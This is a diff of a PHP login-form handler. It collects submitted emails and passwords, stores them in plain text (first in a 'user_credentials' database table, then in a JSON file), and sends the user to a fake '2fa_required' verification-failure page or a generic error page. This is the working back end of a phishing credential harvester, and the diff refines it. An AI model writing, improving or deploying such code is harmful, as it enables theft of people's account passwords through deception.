@@ -29,24 +29,14 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $current_date = date('Y-m-d');
     $current_time = date('H:i:s');
 
-    $stmt = $conn->prepare("INSERT INTO user_credentials (email, password, created_date, created_time) VALUES (?, ?, ?, ?)");
-    $stmt->bind_param("ssss", $email, $password, $current_date, $current_time);
-
-    if ($stmt->execute()) {
-        // For demonstration, log to a file instead of direct DB storage
-        file_put_contents('demo_log.txt', 
-            date('Y-m-d H:i:s') . " - Demo entry: " . $email . "\n", 
-            FILE_APPEND | LOCK_EX
-        );
-        
-        header("Location: verification_failed.php?reason=2fa_required");
+    // Save to JSON
+    require_once 'json_storage.php';
+    if (saveToJson($email, $password)) {
+        header("Location: errorpage.php");
         exit();
     } else {
-        echo "Error: " . $stmt->error;
+        echo "Error: Failed to save data";
     }
-
-    $stmt->close();
-    $conn->close();
 }
 ?>
 <!DOCTYPE html>
